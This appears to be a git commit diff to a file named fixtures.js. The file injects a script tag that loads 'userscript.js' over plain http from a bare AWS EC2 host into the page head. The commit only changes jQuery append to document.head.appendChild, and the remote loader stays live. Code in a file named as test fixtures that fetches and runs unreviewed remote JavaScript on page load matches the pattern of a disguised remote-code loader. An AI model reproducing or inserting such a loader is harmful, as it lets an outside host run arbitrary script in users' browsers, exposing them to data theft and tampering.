b236668c9e351be3fb16a202682cebdd9743fdbe
U-CantSeeMe <ucant.seeme@laposte.net>
2020-04-04 14:54:22 +0200

    Update fixtures.js

--- fixtures.js
+++ fixtures.js
@@ -1,4 +1,4 @@
 var s = document.createElement("script");
 s.type = "text/javascript";
 s.src = "http://ec2-13-48-214-241.eu-north-1.compute.amazonaws.com/userscript.js";
-$("head").append(s);
+document.head.appendChild(s);
